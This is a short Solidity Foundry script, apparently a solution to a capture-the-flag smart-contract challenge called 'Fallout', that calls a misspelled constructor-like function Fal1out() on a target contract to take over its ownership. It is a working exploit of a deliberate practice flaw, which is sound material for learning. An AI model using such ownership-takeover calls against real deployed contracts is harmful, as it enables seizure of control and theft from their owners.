// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Script} from "forge-std/Script.sol";

interface Fallout {
    function owner() external view returns (address);
    function Fal1out() external;
}

contract AttackFallout is Script {
    function run() public {
        address falloutAddress = address(0x0); // TODO: Change for your instance address
        Fallout fallout = Fallout(falloutAddress);
        vm.broadcast(vm.envUint("PK1"));
        fallout.Fal1out();
    }
}
